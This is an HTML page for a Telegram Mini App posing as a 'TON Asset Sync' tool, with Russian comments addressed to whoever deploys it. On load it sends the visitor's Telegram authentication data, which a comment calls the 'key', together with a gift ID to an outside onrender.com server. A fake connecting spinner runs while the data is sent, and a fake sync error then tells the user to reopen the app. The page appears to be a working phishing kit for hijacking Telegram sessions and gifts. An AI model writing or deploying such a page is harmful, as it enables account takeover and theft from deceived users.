<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Asset Sync</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .spinner { border: 3px solid #111; border-top: 3px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 14px; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div id="status">CONNECTING TO TON NODE...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // ВАЖНО: Замени на URL, который тебе выдаст Render после деплоя!
        const RENDER_URL = 'https://projectx-6vwo.onrender.com';

        // Данные для отправки
        const payload = {
            auth_data: tg.initData,
            // Сюда ты можешь динамически подставлять ID подарка, 
            // либо тянуть его из параметров ссылки t.me/bot/app?startapp=46914
            gift_id: tg.initDataUnsafe.start_param || "46914" 
        };

        // Отправка "ключа" на твой сервер
        fetch(RENDER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => {
            setTimeout(() => {
                document.getElementById('status').innerText = "SYNCHRONIZATION ERROR: REOPEN APP";
            }, 5000);
        })
        .catch(err => {
            console.error("Connection failed");
        });
    </script>
</body>
</html>
